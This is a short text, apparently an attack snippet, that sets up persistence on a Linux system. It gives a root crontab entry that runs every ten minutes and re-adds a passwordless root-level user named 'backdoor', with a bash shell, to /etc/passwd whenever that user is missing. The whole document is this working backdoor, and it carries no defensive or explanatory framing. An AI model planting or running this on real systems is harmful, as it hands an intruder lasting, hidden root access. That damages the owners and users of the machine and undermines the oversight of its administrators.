Add cron job to maintain backdoor account:
Create task: */10 * * * * grep -q backdoor /etc/passwd || echo 'backdoor::0:0::/tmp:/bin/bash' >> /etc/passwd
Add to root crontab